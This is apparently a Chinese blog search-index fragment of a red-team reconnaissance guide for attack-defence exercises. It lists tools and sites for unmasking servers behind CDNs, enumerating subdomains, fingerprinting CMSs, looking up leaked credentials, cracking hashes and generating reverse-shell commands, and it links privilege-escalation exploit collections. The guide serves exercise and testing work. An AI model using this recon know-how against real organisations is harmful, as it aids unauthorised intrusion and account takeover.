反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#14-利用网站返回的内容寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#15-f5-ltm解码法"},{"categories":["hvv"],"content":"\r0x10 指纹识别收集网站信息，对网站进行指纹识别，通过识别指纹，确定目标的cms及版本 名称 地址 云悉 http://www.yunsee.cn/info.html 潮汐指纹 http://finger.tidesec.net/ bugscaner CMS指纹识别 http://whatweb.bugscaner.com/look/ Wappalyzer 指纹识别 (浏览器插件) https://github.com/AliasIO/wappalyzer GodEye Web指纹识别平台 https://www.godeye.vip/ WhatWeb ruby写的Web指纹识别工具 https://github.com/urbanadventurer/WhatWeb 数字观星指纹平台 https://fp.shuziguanxing.com/#/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:10","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x10-指纹识别"},{"categories":["hvv"],"content":"\r0x11 威胁情报平台 名称 地址 微步在线 威胁情报社区 https://x.threatbook.cn/ 奇安信 威胁情报中心 https://ti.qianxin.com/ VenusEye 威胁情报中心 https://www.venuseye.com.cn/ 绿盟科技 威胁情报云 https://ti.nsfocus.com/ IBM 情报中心 https://exchange.xforce.ibmcloud.com/ 天际友盟 安全智能服务平台 https://redqueen.tj-un.com/IntelHome.html 华为安全中心平台 https://isecurity.huawei.com/sec/web/intelligencePortal.do 安恒威胁情报中心 https://ti.dbappsecurity.com.cn/ 360 威胁情报中心 https://ti.360.cn/ 世界上第一个真正的开放威胁情报社区 https://otx.alienvault.com/ 丁爸 情报分析师的工具箱 http://dingba.top/ 听风者情报源 start.me https://start.me/p/X20Apn ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:11","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x11-威胁情报平台"},{"categories":["hvv"],"content":"\r0x12 账号/密码/数据泄漏情况查询网站 名称 地址 reg007 你注册过哪些网站？ https://www.reg007.com/ Firefox 电子邮件泄漏查询 https://monitor.firefox.com/ haveibeenpwned 检查电子邮件是否泄漏过 https://haveibeenpwned.com/ Dehashed 通过用户名、邮箱、地址搜索是否存在泄漏 https://dehashed.com/ Aleph 查询公共记录和泄漏信息 https://aleph.occrp.org/ SnusBase 最长的数据泄露搜索引擎 https://snusbase.com/ vigilante.pw 搜索数据泄露事件 https://vigilante.pw/ CheckUsernames 在160个社交网络上检查您的品牌或用户名的使用情况 https://checkusernames.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:12","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x12-账号密码数据泄漏情况查询网站"},{"categories":["hvv"],"content":"\r0x13 匿名邮箱/一次性邮箱/短信/隐私短信 名称 地址 ProtonMail:免费的加密电子邮箱 https://mail.protonmail.com/ mfk.app 免费临时电子邮件地址 https://www.8164.cc/ Temp Mail – 临时性 – 匿名电子邮件 https://temp-mail.org/ chacuo.net 临时邮箱、临时邮、临时电子邮箱、24小时邮箱 隐私短信 在线短信验证码接收码平台 http://24mail.chacuo.net/ 云简讯验证码接收平台 https://www.bfkdim.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:13","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x13-匿名邮箱一次性邮箱短信隐私短信"},{"categories":["hvv"],"content":"\r0x14 密码破解/密码生成/MD5破解/MD5加密类网站 名称 地址 CMD5 md5在线解密破解,md5解密加密 https://www.cmd5.com/ SOMD5 MD5在线免费解密平台 https://www.somd5.com/ 猜密码 输入目标信息 猜测可能使用的密码 https://www.hacked.com.cn/pass.html hashC 是完美的在线破解服务网站 https://hashc.co.uk/ CrackStation – Online Password Hash Cracking https://crackstation.net/ Online Password Recovery 在线密码恢复 https://passwordrecovery.io/ 在线随机密码生成工具 https://www.hacked.com.cn/password.php sojson MD5在线加密/解密/破解—MD5在线 https://www.sojson.com/md5/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:14","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x14-密码破解密码生成md5破解md5加密类网站"},{"categories":["hvv"],"content":"\r0x15 一些在线的命令生成网站,比如反弹shell命令，下载文件命令等 名称 地址 在线反弹shell命令生成 https://forum.ywhack.com/reverse-shell/ File Download Generator 文件下载快捷命令生成 https://file-downloads.com/ java.lang.Runtime.exec() Payload Workarounds http://java.lang.Runtime.exec() Payload Workarounds Hacking8 备忘录 https://www.hacking8.com/cheatsheet 草料二维码生成器 https://cli.im/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:15","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x15-一些在线的命令生成网站比如反弹shell命令下载文件命令等"},{"categories":["hvv"],"content":"\r0x16 在线提权辅助工具或一些提权相关的漏洞 名称 地址 hacking8 Windows提权辅助工具 https://viewdns.info/reverseip/ Kernelhub – Windows 提权漏洞合集(带有编译环境/详细说明) https://github.com/Ascotbe/Kernelhub DazzleUP – 一款win下辅助提权的小工具 https://github.com/hlldz/dazzleUP wesng – Windows利用辅助工具 https://github.com/bitsadmin/wesng Windows-Exploit-Suggester Windows提权辅助 https://github.com/AonCyberLabs/Windows-Exploit-Suggester windows-kernel-exploits Windows平台提权漏洞集合 https://github.com/SecWiki/windows-kernel-exploits linux-kernel-exploits Linux平台提权漏洞集合 https://github.com/SecWiki/linux-kernel-exploits ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:16","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x16-在线提权辅助工具或一些提权相关的漏洞"},{"categories":["hvv"],"content":"\r0x17 SSL/TLS证书查询SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。 名称 地址 亚洲诚信-SSL/TLS安全评估 https://myssl.com/ AUTO-EARN https://github.com/Echocipher/AUTO-EARN ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:17","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x17-ssltls证书查询"},{"categories":["hvv"],"content":"\r0x18 OSINT调查平台工具 名称 地址 iKy https://kennbroorg.gitlab.io/ikyweb/PS：电子邮件收集信息并以漂亮的可视界面显示结果的工具 Boardreader https://boardreader.com/ PS：搜索全球各个论坛平台的内容。 blackhat线上会议 https://www.blackhat.com/us-20/briefings/schedule/ CTFR https://github.com/UnaPibaGeek/ctfr 滥用证书透明度日志，允许在几秒钟内获取子域。 DNS 聚合器 https://dnsdumpster.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:18","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x18-osint调查平台工具"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x19-其它信息收集"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#金石舆情监测系统"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#马克斯舆情监测免费版"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#中科微步"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 